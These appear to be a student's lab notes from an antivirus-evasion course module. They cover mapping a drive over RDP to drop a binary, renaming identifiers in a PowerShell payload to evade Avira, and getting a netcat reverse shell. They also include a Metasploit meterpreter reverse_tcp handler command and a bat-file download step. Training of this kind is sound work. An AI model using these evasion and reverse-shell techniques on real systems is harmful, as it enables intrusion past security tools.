### 14.3.2 Walkthrough

First you turn on the Avira AV app

next  I used this command to open up an RDP and map a drive to drop the binary.exe document in the desktop so the AV can see it
 xfreerdp /v:192.168.215.61 /u:offsec /p:lab /drive:C:\,/home/hollacosta/Downloads            IMPORTANT CMD TO MAP A DRIVE WHILE REMOTING INTO A WINDOWS  COMPUTER

Once dropped, the virus scanner detected it.
Next, created a bypass.ps1 
![[Pasted image 20231017192121.png]]

replaced the "Win32" with "iWin32"
replaced the "sc" with "var1"
replaced the "winFunc" with "var2"
![[Pasted image 20231017192241.png]]
next, dropped the file in Downloads and moved it to the desktop
Opened a Shell prompt and try to run it with no results. Changed the execution policy to be able to run the script
![[Pasted image 20231017192331.png]]
once run and having the nc open, you should be connected!

### 14.3.3 Capstone Exercise #1

![[Pasted image 20231017202017.png]]
![[Pasted image 20231018174525.png]]

![[Pasted image 20231017202440.png]]
Download the 32 .exe file
![[Pasted image 20231018175542.png]]

![[Pasted image 20231018180301.png]]
for this payload, we use the following msfvenom

$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.181;set LPORT 443;run;" ^afd7cb

### 14.3.3 Q3 CAPSTONE EXERCISE #2
to use it, make sure you change the directory
to see the payload list
![[Pasted image 20231018185318.png]]

![[Pasted image 20231018185426.png]]
after creating the bat file, you can use it to download it onto the target while you have a meterpreter rev_tcp listener
use msfvenom interpreter
![[Pasted image 20231018190737.png]]
same principles as the previous capstone


